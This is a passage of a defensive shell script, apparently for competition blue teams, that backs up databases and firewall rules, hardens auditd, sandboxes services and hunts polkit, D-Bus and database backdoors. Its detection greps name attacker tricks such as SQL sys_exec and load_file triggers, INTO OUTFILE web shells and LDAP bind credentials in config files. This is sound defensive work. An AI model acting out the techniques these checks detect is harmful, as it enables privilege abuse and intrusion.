                   -o -name '*.xml' -o -name '*.properties' -o -name '*.env' -o -name '.env' -o -name '*.php' -o -name '*.toml' \) \
                ! -path "$VAULT/*" ! -path '*/node_modules/*' ! -path '/etc/ssl/*' ! -path '/etc/ldap/schema/*' ! -path '/etc/openldap/schema/*' 2>/dev/null
         done | head -4000 | while read -r pf; do
            [ -n "$BAIT" ] && [ "$pf" = "$BAIT" ] && continue
            grep -q -F -x -- "$pf" "$VAULT/.decoypaths.$$" 2>/dev/null && continue
            grep -v -E '^[[:space:]]*[#;]' "$pf" 2>/dev/null | grep -q -i -E 'bind_?dn|bindCredential|ldap_bind|ldaps?://[a-z0-9]' && say "$pf"
         done | head -15)
    [ -n "$pl" ] && po="$po
  files where an app logs in to LDAP or AD with its own account (a password change on the DC breaks these):
$(say "$pl" | sed 's/^/    /')"
    pj=$(domain_detect 2>/dev/null | head -1)
    if [ -n "$pj" ]; then
        po="$po
  this box is joined to a domain ($pj). Its services break if the DC, DNS or the clock is off: sh first30.sh domain
    If the computer account breaks and the DC is Windows Server 2025, rejoin with:
      adcli join --domain <your domain> -U <a domain admin> --ldap-passwd      (placeholders: your domain, your admin)"
    fi
    pdk=$( (have docker && docker ps --format '{{.Names}}' 2>/dev/null | head -8 | tr '\n' ' ') )
    [ -n "$pdk" ] && po="$po
  containers running here: $pdk
    Docker keeps its own firewall chains. Flushing the firewall (iptables -F, nft flush ruleset) cuts every container
    off. This script saves the rules in every backup: sh first30.sh fw-restore puts them back."
    if [ -n "$po" ]; then
        say "$po" | sed '/^$/d'
        say "  Rule from Invitational 2: when many services fail at once, look for the ONE shared cause before fixing each."
        nxt "write these in your notes now. Before a password change: sh first30.sh findpass shows which files hold the old one."
    else
        ok "no Vault, Keycloak, LDAP binds, domain join or containers found here"
    fi
    rm -f "$VAULT/.decoypaths.$$"
}
do_plumbing() { need_root; chk_plumbing; decoy_rearm; }
decoy_paths() { awk '{print $1}' "$DECOYS" 2>/dev/null > "$VAULT/.decoypaths.$$"; }

# ---------------------------------------------------------------- database and firewall backups
db_backup() {
    db_any=''
    if have mysqldump && { have mysql || have mariadb; }; then
        db_c=mysql; have mysql || db_c=mariadb
        if tmo 5 "$db_c" -N -e 'select 1' >/dev/null 2>&1; then
            db_f="$VAULT/db_mysql_${HOST}_$TS.sql.gz"
            if tmo 300 mysqldump --all-databases --single-transaction --routines --events 2> "$db_f.err" | gzip > "$db_f" && [ -s "$db_f" ] && ! grep -q -i 'error' "$db_f.err"; then
                sha256sum "$db_f" > "$db_f.sha256"; chmod 600 "$db_f" "$db_f.sha256" "$db_f.err"
                say "Database dump (MySQL/MariaDB): $db_f ($(du -k "$db_f" | awk '{print $1}') KB)"
                say "  Put it back: gunzip -c $db_f | $db_c"
                db_any=1
            else
                say "MySQL/MariaDB dump did not finish cleanly. See $db_f.err"; chmod 600 "$db_f" "$db_f.err" 2>/dev/null
            fi
        else
            say "MySQL/MariaDB is here, but root cannot log in through the local socket without a password, so no dump was taken."
            say "  A lead takes it by hand: mysqldump --all-databases --single-transaction -u root -p | gzip > $VAULT/db_mysql.sql.gz"
        fi
    fi
    if have pg_dumpall && id postgres >/dev/null 2>&1 && pgrep -u postgres >/dev/null 2>&1; then
        db_f="$VAULT/db_postgres_${HOST}_$TS.sql.gz"
        if have runuser; then db_r='runuser -u postgres --'; else db_r='su postgres -s /bin/sh -c'; fi
        if [ "$db_r" = 'runuser -u postgres --' ]; then
            (cd /tmp && tmo 300 runuser -u postgres -- pg_dumpall 2> "$db_f.err") | gzip > "$db_f"
        else
            (cd /tmp && tmo 300 su postgres -s /bin/sh -c pg_dumpall 2> "$db_f.err") | gzip > "$db_f"
        fi
        if [ "$(gunzip -c "$db_f" 2>/dev/null | head -c 200 | wc -c)" -gt 50 ] && ! grep -q -i -E 'error|fatal' "$db_f.err" 2>/dev/null; then
            sha256sum "$db_f" > "$db_f.sha256"; chmod 600 "$db_f" "$db_f.sha256" "$db_f.err"
            say "Database dump (PostgreSQL): $db_f ($(du -k "$db_f" | awk '{print $1}') KB)"
            say "  Put it back: gunzip -c $db_f | $db_r psql postgres"
            db_any=1
        else
            say "PostgreSQL dump did not work (is the server running?). See $db_f.err"; rm -f "$db_f"; chmod 600 "$db_f.err" 2>/dev/null
        fi
    fi
    [ -n "$db_any" ] && autonote "took database dumps into the vault"
    return 0
}
fw_backup() {
    fw_any=''
    if have iptables-save && iptables-save > "$VAULT/fw_iptables_${HOST}_$TS.rules" 2>/dev/null && [ -s "$VAULT/fw_iptables_${HOST}_$TS.rules" ]; then fw_any="$fw_any iptables"; else rm -f "$VAULT/fw_iptables_${HOST}_$TS.rules"; fi
    if have ip6tables-save && ip6tables-save > "$VAULT/fw_ip6tables_${HOST}_$TS.rules" 2>/dev/null && [ -s "$VAULT/fw_ip6tables_${HOST}_$TS.rules" ]; then fw_any="$fw_any ip6tables"; else rm -f "$VAULT/fw_ip6tables_${HOST}_$TS.rules"; fi
    if have nft && nft list ruleset > "$VAULT/fw_nft_${HOST}_$TS.nft" 2>/dev/null && [ -s "$VAULT/fw_nft_${HOST}_$TS.nft" ]; then fw_any="$fw_any nft"; else rm -f "$VAULT/fw_nft_${HOST}_$TS.nft"; fi
    chmod 600 "$VAULT"/fw_*_"${HOST}_$TS".* 2>/dev/null
    if [ -n "$fw_any" ]; then
        say "Firewall rules saved ($fw_any ) in $VAULT. If someone flushes the firewall: sh first30.sh fw-restore"
    fi
    return 0
}
do_fwrestore() {
    need_root
    say "== Put the saved firewall rules back"
    fr_i=$(ls -t "$VAULT"/fw_iptables_"$HOST"_*.rules 2>/dev/null | head -1)
    fr_6=$(ls -t "$VAULT"/fw_ip6tables_"$HOST"_*.rules 2>/dev/null | head -1)
    fr_n=$(ls -t "$VAULT"/fw_nft_"$HOST"_*.nft 2>/dev/null | head -1)
    if [ -z "$fr_i$fr_n" ]; then say "  No saved rules in $VAULT. sh first30.sh backup saves them."; return 0; fi
    say "  newest saved: ${fr_i:-none (iptables)}   ${fr_n:-none (nft)}"
    why "this replaces the rules that are loaded now with the saved ones. Blocks you added after that backup are lost (re-add them: sh first30.sh block <address>)."
    byhand "iptables-restore < <file>      or      nft flush ruleset; nft -f <file>"
    [ -t 0 ] || { say "  Not asked here (no keyboard). Use the By hand commands."; return 0; }
    yes_ask "Replace the loaded firewall rules with the saved ones?" || { say "  Nothing changed."; return 0; }
    # iptables on top of nft (iptables-nft): restoring both would load everything twice, so pick one
    if [ -n "$fr_i" ] && have iptables-restore; then
        iptables-save > "$VAULT/fw_iptables_${HOST}_before_restore_$TS.rules" 2>/dev/null
        if iptables-restore < "$fr_i"; then say "  iptables rules restored from $fr_i"; else say "  iptables-restore failed. Nothing else was tried."; return 1; fi
        [ -n "$fr_6" ] && have ip6tables-restore && ip6tables-restore < "$fr_6" 2>/dev/null && say "  ip6tables rules restored"
    elif [ -n "$fr_n" ] && have nft; then
        nft list ruleset > "$VAULT/fw_nft_${HOST}_before_restore_$TS.nft" 2>/dev/null
        if nft flush ruleset && nft -f "$fr_n"; then say "  nft rules restored from $fr_n"; else say "  nft restore failed. The rules from before are in $VAULT/fw_nft_${HOST}_before_restore_$TS.nft"; return 1; fi
    fi
    autonote "restored the firewall rules from the vault"
    say "  Check your scored services now. If containers lost their network: systemctl restart docker"
}

# ---------------------------------------------------------------- ssh lockout guard
# Before root SSH login is turned off: can one of the other accounts become root?
ssh_admin_guard() {   # $1 = the other accounts that can log in
    sg_ok=''
    for sg_u in $1; do
        sg_g=$(id -nG "$sg_u" 2>/dev/null)
        case " $sg_g " in *' sudo '*|*' wheel '*|*' admin '*) sg_ok="$sg_ok $sg_u"; continue ;; esac
        grep -r -q -E "^[[:space:]]*${sg_u}[[:space:]]" /etc/sudoers /etc/sudoers.d 2>/dev/null && sg_ok="$sg_ok $sg_u"
    done
    if [ -n "$sg_ok" ]; then say "Accounts that can log in AND use sudo:$sg_ok"; return 0; fi
    say "None of the accounts that can log in ($1) can use sudo."
    say "After this change you could only become root with: su -   (and the root password)."
    [ -t 0 ] || { say "Nothing changed. Add an account to the sudo or wheel group first."; return 1; }
    yes_ask "Do you know the root password, and still want root SSH login off?" || { say "Nothing changed."; return 1; }
    return 0
}

# ---------------------------------------------------------------- auditd hardening
audit_harden() {
    ah_c=/etc/audit/auditd.conf
    if [ -f "$ah_c" ] && [ ! -L "$ah_c" ]; then
        [ -f "$VAULT/auditd.conf_${HOST}_before.bak" ] || cp -p "$ah_c" "$VAULT/auditd.conf_${HOST}_before.bak"
        ah_ch=''
        for ah_kv in 'max_log_file_action=ROTATE' 'space_left_action=SYSLOG'; do
            ah_k=${ah_kv%%=*}; ah_v=${ah_kv#*=}
            ah_now=$(awk -F= -v k="$ah_k" '{x = $1; gsub(/[[:space:]]/, "", x)} tolower(x) == k {v = $2; gsub(/[[:space:]]/, "", v); print toupper(v)}' "$ah_c" | tail -1)
            [ "$ah_now" = "$ah_v" ] && continue
            if [ -n "$ah_now" ]; then
                awk -F= -v k="$ah_k" -v v="$ah_v" '{x = $1; gsub(/[[:space:]]/, "", x)} tolower(x) == k {print k " = " v; next} {print}' "$ah_c" > "$VAULT/.auditconf.$$" &&
                    cat "$VAULT/.auditconf.$$" > "$ah_c"
                rm -f "$VAULT/.auditconf.$$"
            else printf '%s = %s\n' "$ah_k" "$ah_v" >> "$ah_c"; fi
            ah_ch="$ah_ch $ah_k=$ah_v(was ${ah_now:-unset})"
        done
        if [ -n "$ah_ch" ]; then
            say "auditd.conf:$ah_ch"
            say "  Why: with the old values, red team can fill the log to make auditd stop logging or halt. Now it rotates and keeps going."
            ah_p=$(pidof auditd 2>/dev/null) && kill -HUP $ah_p 2>/dev/null
        fi
    fi
    if [ -d /run/systemd/system ] && [ -d /etc/systemd/system ]; then
        ah_d=/etc/systemd/system/auditd.service.d
        if [ ! -f "$ah_d/first30.conf" ] && [ ! -L "$ah_d" ]; then
            mkdir -p "$ah_d" && printf '[Unit]\nRefuseManualStop=yes\n[Service]\nProtectControlGroups=yes\nProtectKernelModules=yes\n' > "$ah_d/first30.conf" && systemctl daemon-reload 2>/dev/null
            say "auditd can no longer be stopped with systemctl stop (RefuseManualStop). Undo: rm $ah_d/first30.conf; systemctl daemon-reload"
        fi
    fi
    autonote "hardened auditd (log rotation settings, RefuseManualStop)"
}

# ---------------------------------------------------------------- lock-svc: fence in a service your team runs
LOCKSVC_NEVER='sshd ssh auditd docker containerd k3s k3s-agent kubelet crio dbus dbus-broker systemd-journald systemd-logind systemd-udevd systemd-networkd systemd-resolved NetworkManager networking firewalld ufw cron crond rsyslog sssd polkit getty'
do_locksvc() {
    need_root
    ls_s=${1%.service} ls_u=$2
    if [ -z "$ls_s" ]; then
        say "Usage: sh first30.sh lock-svc <service> [account]      undo: sh first30.sh undo-lock-svc <service>"
        say "  Fences in a service your team installed (a runner, an exporter, your own app), so that if red team"
        say "  breaks into it, they cannot use it to become root or to change the system."
        return 0
    fi
    if [ ! -d /run/systemd/system ]; then say "This box does not use systemd, so lock-svc cannot help here. Nothing changed."; return 0; fi
    case " $LOCKSVC_NEVER " in *" $ls_s "*) say "$ls_s is a core system service. Fencing it in would break the box. Nothing changed."; return 0 ;; esac
    if ! systemctl cat "$ls_s.service" >/dev/null 2>&1; then say "No service called $ls_s. See them: systemctl list-units --type=service"; return 0; fi
    ls_d="/etc/systemd/system/$ls_s.service.d"
    ls_f="$ls_d/first30-sandbox.conf"
    if [ -L "$ls_d" ] || [ -L "$ls_f" ]; then say "$ls_d is a link. That is a trap. Nothing changed."; return 1; fi
    if [ -f "$ls_f" ]; then say "$ls_s is already fenced in ($ls_f). Undo: sh first30.sh undo-lock-svc $ls_s"; return 0; fi
    ls_cur=$(systemctl show "$ls_s.service" -p User --value 2>/dev/null); [ -n "$ls_cur" ] || ls_cur=root
    ls_exec=$(systemctl show "$ls_s.service" -p ExecStart --value 2>/dev/null | sed -n 's/.*path=\([^ ;]*\).*/\1/p' | head -1)
    ls_wd=$(systemctl show "$ls_s.service" -p WorkingDirectory --value 2>/dev/null)
    ls_was=$(systemctl is-active "$ls_s.service" 2>/dev/null)
    say "== Fence in $ls_s"
    say "  runs as: $ls_cur     program: ${ls_exec:-?}     folder: ${ls_wd:-none}     now: $ls_was"
    ls_home='ProtectHome=yes'
    case "$ls_exec $ls_wd" in */home/*|*/root/*) ls_home=''; say "  It lives under /home or /root, so ProtectHome is left out (it would hide the service's own files)." ;; esac
    ls_user=''
    if [ -n "$ls_u" ]; then
        if ! id "$ls_u" >/dev/null 2>&1; then
            if have useradd; then useradd -r -s /usr/sbin/nologin -d /nonexistent -M "$ls_u" 2>/dev/null || useradd -r -s /sbin/nologin -d /nonexistent -M "$ls_u"
            else say "No useradd here. Create the account $ls_u first. Nothing changed."; return 1; fi
            say "  created the account $ls_u (no password, no login shell, no home)"
        fi
        ls_user="User=$ls_u
Group=$(id -gn "$ls_u")"
        say "  it will run as $ls_u instead of $ls_cur."
        say "  IMPORTANT: $ls_u must be able to read the service's files. If it fails to start, this is undone for you."
    elif [ "$ls_cur" = root ]; then
        say "  It runs as root and you gave no account, so it stays root, inside the fence."
        say "  Stronger: sh first30.sh lock-svc $ls_s <a new account name>   (the account is created for you)"
    fi
    why "NoNewPrivileges stops sudo and SUID tricks from inside the service. ProtectSystem makes /usr, /boot and /etc read-only for it. PrivateTmp gives it its own /tmp. The Protect* lines stop it changing kernel settings or loading modules."
    byhand "systemctl edit $ls_s   and type the same lines; then systemctl restart $ls_s"
    [ -t 0 ] || { say "  Not changed here (no keyboard to confirm)."; return 0; }
    yes_ask "Write the fence and restart $ls_s (about 2 seconds of downtime)?" || { say "  Nothing changed."; return 0; }
    mkdir -p "$ls_d"
    {
        say "# written by first30 lock-svc. Undo: sh first30.sh undo-lock-svc $ls_s"
        say "[Service]"
        [ -n "$ls_user" ] && say "$ls_user"
        say "NoNewPrivileges=yes"
        say "PrivateTmp=yes"
        say "ProtectSystem=full"
        [ -n "$ls_home" ] && say "$ls_home"
        say "ProtectKernelTunables=yes"
        say "ProtectKernelModules=yes"
        say "ProtectControlGroups=yes"
        say "RestrictSUIDSGID=yes"
    } > "$ls_f"
    chmod 644 "$ls_f"
    systemctl daemon-reload
    if [ "$ls_was" = active ]; then
        systemctl restart "$ls_s.service" 2>/dev/null
        sleep 3
        if [ "$(systemctl is-active "$ls_s.service" 2>/dev/null)" != active ]; then
            say "  $ls_s did not come back up inside the fence. Reason:"
            systemctl status "$ls_s.service" --no-pager -n 6 2>&1 | tail -6 | sed 's/^/    /'
            rm -f "$ls_f"; rmdir "$ls_d" 2>/dev/null
            systemctl daemon-reload; systemctl restart "$ls_s.service" 2>/dev/null; sleep 2
            say "  The fence was removed and the service restarted: now $(systemctl is-active "$ls_s.service" 2>/dev/null). Nothing is changed."
            say "  Usual cause: it writes under /etc or /usr, or the new account cannot read its files."
            return 1
        fi
    fi
    autonote "fenced in the service $ls_s ($ls_f)"
    say "  Done: $ls_s is $(systemctl is-active "$ls_s.service" 2>/dev/null), inside the fence. Check that it still does its job (and the scoreboard)."
    say "  Score it: systemd-analyze security $ls_s    Undo: sh first30.sh undo-lock-svc $ls_s"
}
do_unlocksvc() {
    need_root
    ul_s=${1%.service}
    [ -n "$ul_s" ] || { say "Usage: sh first30.sh undo-lock-svc <service>"; return 0; }
    ul_f="/etc/systemd/system/$ul_s.service.d/first30-sandbox.conf"
    if [ ! -f "$ul_f" ]; then say "$ul_s has no first30 fence. Nothing changed."; return 0; fi
    rm -f "$ul_f"; rmdir "/etc/systemd/system/$ul_s.service.d" 2>/dev/null
    systemctl daemon-reload
    systemctl try-restart "$ul_s.service" 2>/dev/null
    autonote "removed the fence from the service $ul_s"
    say "Fence removed. $ul_s is now: $(systemctl is-active "$ul_s.service" 2>/dev/null)"
}

# ---------------------------------------------------------------- scrub: a password typed in plain sight
do_scrub() {
    need_root
    say "== Scrub a password out of the history files"
    say "  FIRST change that password. Someone may have read it already, and a running command line"
    say "  shows in ps for every user. Scrubbing only stops the NEXT reader."
    why "this removes only the lines that contain the password. The rest of the history stays, because history is also evidence of what red team typed."
    [ -t 0 ] || { say "  This needs a keyboard (the password is typed hidden). Nothing changed."; return 0; }
    yes_ask "Have you already changed the leaked password?" || { say "  Change it first, then run this again. Nothing changed."; return 0; }
    read_secret "Type the LEAKED (old) password. It is hidden and is not saved anywhere:"
    if [ "${#SECRET}" -lt 4 ]; then say "  Too short to search for safely. Nothing changed."; SECRET=''; return 0; fi
    sc_pat="$VAULT/.scrub.$$"
    printf '%s\n' "$SECRET" > "$sc_pat"; chmod 600 "$sc_pat"; SECRET=''
    sc_n=0
    for sc_h in /root $(awk -F: '$3 >= 500 && $6 ~ /^\// {print $6}' /etc/passwd | sort -u); do
        for sc_f in "$sc_h"/.bash_history "$sc_h"/.zsh_history "$sc_h"/.sh_history "$sc_h"/.ash_history "$sc_h"/.history \
            "$sc_h"/.mysql_history "$sc_h"/.mariadb_history "$sc_h"/.psql_history "$sc_h"/.python_history "$sc_h"/.sqlite_history \
            "$sc_h"/.rediscli_history "$sc_h"/.node_repl_history "$sc_h"/.lesshst "$sc_h"/.viminfo \
            "$sc_h"/.local/share/fish/fish_history "$sc_h"/.local/share/powershell/PSReadLine/ConsoleHost_history.txt; do
            [ -f "$sc_f" ] && [ ! -L "$sc_f" ] || continue
            sc_c=$(grep -c -F -f "$sc_pat" "$sc_f" 2>/dev/null)
            [ "${sc_c:-0}" -gt 0 ] || continue
            grep -v -F -f "$sc_pat" "$sc_f" > "$sc_f.first30.$$"
            cat "$sc_f.first30.$$" > "$sc_f"; rm -f "$sc_f.first30.$$"
            say "  removed $sc_c line(s) from $sc_f"
            sc_n=$((sc_n + sc_c))
        done
    done
    rm -f "$sc_pat"
    if [ "$sc_n" -eq 0 ]; then say "  Not found in any history file."; else autonote "scrubbed a leaked password from history files ($sc_n lines)"; fi
    say "  Still to do by hand, in each shell that is open right now (its history is in memory, and is written when it closes):"
    say "      history -c          (bash and zsh: forget this window's history)"
    say "  The audit log and the journal may also hold the command line. They are evidence, so they are left alone."
    remind "PCR or team note: a password was exposed in command history and was changed"
}

# ======================================================================
# and D-Bus rules, database backdoors, Kubernetes webhooks, and "report":
# one block with the facts a packet entry or incident report needs.
# ======================================================================

# ---------------------------------------------------------------- every address on this box
ip_all() {   # lines: ADDRESS/BITS DEVICE KIND
    if have ip; then
        ip -4 -o addr show 2>/dev/null | awk '$2 != "lo" {
            k = "primary"; if ($0 ~ / secondary /) k = "SECONDARY"; else if (seen[$2]++) k = "SECONDARY"
            if ($2 ~ /^(docker|br-|cni|flannel|cali|veth|kube|virbr|podman|lxc|tun|tap|wg|tailscale|zt|ligolo)/) k = k " (container, bridge or tunnel device)"
            print $4, $2, k }'
    else
        ifconfig 2>/dev/null | awk '/^[a-z0-9]/ {d = $1; sub(/:$/, "", d)} /inet / && d != "lo" {a = $2; sub(/^addr:/, "", a); print a, d, "primary-or-secondary"}'
    fi
}
chk_ips() {
    sec ips "Every address on this box: write ALL of them in the packet documentation (T1557, T1090)"
    ia=$(ip_all)
    say "$ia" | awk '{printf "  %-20s %-14s %s\n", $1, $2, substr($0, index($0, $3))}'
    ik=''
    if { have kubectl || have k3s; } && tmo k8s_cmd get namespaces >/dev/null 2>&1; then
        ik=$(tmo k8s_cmd get svc -A --no-headers -o custom-columns='NS:.metadata.namespace,N:.metadata.name,T:.spec.type,E:.status.loadBalancer.ingress[*].ip,X:.spec.externalIPs[*]' 2>/dev/null |
            awk '($4 != "<none>" && $4 != "") || ($5 != "<none>" && $5 != "") {print "  Kubernetes gives " $1 "/" $2 " (" $3 ") the address(es): " $4 " " $5}' | sed 's/<none>//g')
        [ -n "$ik" ] && say "$ik"
    fi
    iv=''
    for iw in keepalived kube-vip metallb speaker haproxy; do pgrep -f "$iw" >/dev/null 2>&1 && iv="$iv $iw"; done
    [ -n "$iv" ] && say "  floating-address software is running:$iv. Its addresses can move between boxes: document them too."
    in_n=$(printf '%s\n%s\n' "$(say "$ia" | awk '{print $1, $2}')" "$ik" | sed '/^$/d' | v5_base ips)
    if [ -n "$in_n" ]; then
        say "  addresses that are new or gone since this script's first run here:"; say "$in_n" | sed 's/^/    /'
        flag
        nxt "a new address your team did not add can catch traffic meant for another box. See it: ip -4 addr show. Remove one: ip addr del <address/bits> dev <device>"
    elif printf '%s\n' "$ia" | grep -q SECONDARY || [ -n "$ik" ]; then
        say "  This box answers on MORE THAN ONE address. At Invitational 2, teams lost points for leaving the extra ones out."
    else
        ok "one address per network card, and nothing new"
    fi
}

# ---------------------------------------------------------------- the clock
chk_clock() {
    sec clock "The clock: Kerberos and AD logins break when it is more than 5 minutes off (T1070.006, T1529)"
    say "  UTC now:   $(date -u '+%Y-%m-%d %H:%M:%S')    <- compare with your phone. It must match within 1 minute."
    say "  local now: $(date '+%Y-%m-%d %H:%M:%S %Z')    time zone: $(cat /etc/timezone 2>/dev/null || readlink /etc/localtime 2>/dev/null | sed 's:.*zoneinfo/::')"
    ct=''
    for cs in chronyd chrony systemd-timesyncd ntpd ntp ntpsec openntpd; do
        if pgrep -x "$cs" >/dev/null 2>&1 || { [ -d /run/systemd/system ] && systemctl is-active --quiet "$cs" 2>/dev/null; }; then ct="$ct $cs"; fi
    done
    [ -n "$ct" ] && say "  time service running:$ct" || say "  no time service is running: the clock drifts, and anyone with root can set it."
    if have chronyc; then cc=$(tmo chronyc tracking 2>/dev/null | grep -E '^(Reference ID|System time|Leap status)' | sed 's/^/    /'); [ -n "$cc" ] && say "$cc"; fi
    if have timedatectl; then cy=$(tmo timedatectl show -p NTPSynchronized --value 2>/dev/null); [ -n "$cy" ] && say "  synchronized with a time server: $cy"; fi
    cd_n=$(printf '%s\n' $ct | sed '/^$/d' | v5_base timesvc)
    if [ -n "$cd_n" ]; then
        say "  the time service changed since this script's first run here:"; say "$cd_n" | sed 's/^/    /'
        flag
        nxt "if the clock is wrong: set it from the DC or your phone (date -u -s 'YYYY-MM-DD HH:MM:SS'), restart the time service, then test a domain login. Menu 16 compares this clock with the DC."
    fi
    byhand "date -u ; timedatectl ; chronyc tracking   (the DC is the clock for the whole domain)"
}

# ---------------------------------------------------------------- polkit and D-Bus rules
# sudoers is watched, so the quiet way to hand out root is a polkit rule
# (pkexec, systemctl, package installs with no password) or a D-Bus policy.
chk_polkit() {
    sec polkit "polkit and D-Bus rules that give root without a password (T1548, T1543)"
    pk=''
    for pd in /etc/polkit-1/rules.d /usr/share/polkit-1/rules.d /usr/local/share/polkit-1/rules.d /run/polkit-1/rules.d; do
        [ -d "$pd" ] || continue
        for pf in "$pd"/*.rules; do
            [ -f "$pf" ] || continue
            grep -q -E 'polkit\.Result\.YES' "$pf" 2>/dev/null || continue
            from_package "$pf"; pr=$?
            if [ "$pr" = 1 ]; then pk="$pk
  $pf: says YES without a password, and no package installed it:
$(grep -n -E 'Result\.YES|action\.id|subject\.(user|isInGroup)' "$pf" | head -5 | sed 's/^/      /')"; fi
        done
    done
    for pd in /etc/polkit-1/localauthority /var/lib/polkit-1/localauthority; do
        [ -d "$pd" ] || continue
        for pf in $(find "$pd" -type f -name '*.pkla' 2>/dev/null); do
            grep -q -i -E '^Result(Any|Inactive|Active)[[:space:]]*=[[:space:]]*yes' "$pf" 2>/dev/null || continue
            from_package "$pf"; [ $? = 1 ] || continue
            pk="$pk
  $pf: grants actions with no password (old-style polkit rule), and no package installed it:
$(grep -E '^(Identity|Action|Result)' "$pf" | head -6 | sed 's/^/      /')"
        done
    done
    pa=$(grep -r -h -E '^[[:space:]]*AdminIdentities' /etc/polkit-1/localauthority.conf.d 2>/dev/null | tail -1)
    case "$pa" in ''|*'unix-group:sudo'*|*'unix-group:wheel'*|*'unix-group:admin'*|*'unix-user:0'*) ;; *) pk="$pk
  polkit admins were changed: $pa" ;; esac
    for pf in /etc/dbus-1/system.d/*.conf /etc/dbus-1/system-local.conf; do
        [ -f "$pf" ] || continue
        from_package "$pf"; [ $? = 1 ] || continue
        grep -q -E '<allow[[:space:]]+(own|send_destination|user)=' "$pf" 2>/dev/null && pk="$pk
  $pf: a D-Bus policy no package installed (it can let any user talk to a root service)"
    done
    pd_n=$( { for pd in /etc/polkit-1 /etc/dbus-1/system.d /usr/share/polkit-1/rules.d; do [ -d "$pd" ] && find "$pd" -type f 2>/dev/null; done; } |
        while read -r pf; do sha256sum "$pf" 2>/dev/null; done | awk '{print $2, substr($1, 1, 12)}' | v5_base polkit | head -20)
    if [ -n "$pk$pd_n" ]; then
        [ -n "$pk" ] && say "$pk" | sed '/^$/d'
        [ -n "$pd_n" ] && { say "  polkit or D-Bus files that are new, gone or changed since this script's first run here:"; say "$pd_n" | sed 's/^/    /'; }
        flag
        nxt "test it as a normal user: pkexec id   (it must ask for a password). If your team did not write the rule: sh first30.sh evidence <file>, then delete the file. polkit reads the change at once."
    else
        ok "no password-free polkit rules outside the packaged ones, and nothing changed"
    fi
}

# ---------------------------------------------------------------- database backdoors
db_my() { tmo "$DB_C" -N -B -e "$1" 2>/dev/null; }
db_pg() { if have runuser; then (cd /tmp && tmo runuser -u postgres -- psql -At -c "$1" 2>/dev/null); else (cd /tmp && tmo su postgres -s /bin/sh -c "psql -At -c \"$1\"" 2>/dev/null); fi; }
chk_db() {
    DB_C=''
    have mysql && DB_C=mysql; [ -z "$DB_C" ] && have mariadb && DB_C=mariadb
    db_m=''; [ -n "$DB_C" ] && [ "$(db_my 'select 1')" = 1 ] && db_m=1
    db_p=''; have psql && id postgres >/dev/null 2>&1 && pgrep -u postgres >/dev/null 2>&1 && [ "$(db_pg 'select 1')" = 1 ] && db_p=1
    if [ -z "$db_m$db_p" ]; then
        if pgrep -x mysqld >/dev/null 2>&1 || pgrep -x mariadbd >/dev/null 2>&1 || pgrep -u postgres >/dev/null 2>&1; then
            sec db "Database accounts and backdoors (T1136, T1505, T1546)"
            say "  a database is running, but root cannot log in through the local socket without a password, so it was not checked."
            byhand "mysql -u root -p -e \"select user,host,plugin from mysql.user\"      or      sudo -u postgres psql -c '\\du'"
        fi
        return 0
    fi
    sec db "Database accounts and backdoors (T1136, T1505, T1546)"
    do=''
    if [ -n "$db_m" ]; then
        dq=$(db_my "select concat(user,'@',host) from mysql.user where Super_priv='Y' or Grant_priv='Y'" | sort -u)
        say "  MySQL/MariaDB accounts with admin rights: $(say "$dq" | tr '\n' ' ')"
        dd=$(say "$dq" | sed '/^$/d' | v5_base dbadmins)
        [ -n "$dd" ] && do="$do
  database admins that are new or gone since the first run: $(say "$dd" | tr '\n' ' ')"
        dr=$(db_my "select concat(user,'@',host) from mysql.user where host='%' and (Super_priv='Y' or Grant_priv='Y' or File_priv='Y')" | tr '\n' ' ')
        [ -n "$dr" ] && do="$do
  admin or FILE rights for an account that can log in from ANY address (host %): $dr"
        de=$(db_my "select concat(user,'@',host) from mysql.user where (authentication_string='' or authentication_string is null) and plugin not in ('unix_socket','auth_socket','auth_pam','mysql_no_login') and user not in ('mariadb.sys','mysql.sys','mysql.session','mysql.infoschema','PUBLIC')" | tr '\n' ' ')
        [ -n "$de" ] && do="$do
  accounts with NO password: $de"
        du=$(db_my "select concat(name,' -> ',dl) from mysql.func" | tr '\n' ';')
        [ -n "$du" ] && do="$do
  user-defined functions loaded from a library file (the classic way to run OS commands from SQL): $du"
        dp=$(db_my "select @@plugin_dir")
        if [ -d "$dp" ]; then
            for df in "$dp"/*.so; do
                [ -f "$df" ] || continue
                from_package "$df"; [ $? = 1 ] && do="$do
  $df: a plugin library no package installed"
            done
        fi
        ds=$(db_my "select ifnull(@@secure_file_priv,'NULL')")
        [ -z "$ds" ] && do="$do
  secure_file_priv is EMPTY: SQL can read and write any file the database account can (INTO OUTFILE web shells). Set it in my.cnf: secure_file_priv=/var/lib/mysql-files"
        dt=$(db_my "select concat(trigger_schema,'.',trigger_name,' on ',event_object_table,': ',left(replace(action_statement,'\n',' '),90)) from information_schema.triggers where trigger_schema not in ('sys','mysql')" | head -12)
        dtn=$(db_my "select concat(trigger_schema,'.',trigger_name,' ',md5(action_statement)) from information_schema.triggers where trigger_schema not in ('sys','mysql')" | v5_base dbtriggers | head -10)
        [ -n "$dtn" ] && do="$do
  triggers that are new, gone or changed since the first run:
$(say "$dtn" | sed 's/^/      /')"
        dx=$(say "$dt" | grep -i -E 'outfile|dumpfile|load_file|sys_exec|sys_eval|mysql\.user|grant |create user|set password' )
        [ -n "$dx" ] && do="$do
  triggers that write files, run commands or touch accounts:
$(say "$dx" | sed 's/^/      /')"
        dv=$(db_my "select concat(event_schema,'.',event_name,': ',left(replace(event_definition,'\n',' '),80)) from information_schema.events" | head -8)
        [ -n "$dv" ] && do="$do
  scheduled events inside the database (they run SQL on a timer, like cron):
$(say "$dv" | sed 's/^/      /')"
        dg=$(db_my "select concat(@@general_log,' ',@@general_log_file)")
        case "$dg" in 1*.php|1*/www/*|1*/html/*|ON*.php|ON*/www/*|ON*/html/*) do="$do
  the query log is being written into a web folder ($dg): that is a web shell trick" ;; esac
    fi
    if [ -n "$db_p" ]; then
        dq=$(db_pg "select rolname from pg_roles where rolsuper or rolcreaterole or rolbypassrls" | sort -u)
        say "  PostgreSQL roles with admin rights: $(say "$dq" | tr '\n' ' ')"
        dd=$(say "$dq" | sed '/^$/d' | v5_base pgadmins)
        [ -n "$dd" ] && do="$do
  PostgreSQL admin roles that are new or gone since the first run: $(say "$dd" | tr '\n' ' ')"
        dm=$(db_pg "select r.rolname from pg_auth_members m join pg_roles g on g.oid=m.roleid join pg_roles r on r.oid=m.member where g.rolname in ('pg_execute_server_program','pg_write_server_files','pg_read_server_files')" | tr '\n' ' ')
        [ -n "$dm" ] && do="$do
  roles that may run OS programs or read and write server files from SQL: $dm"
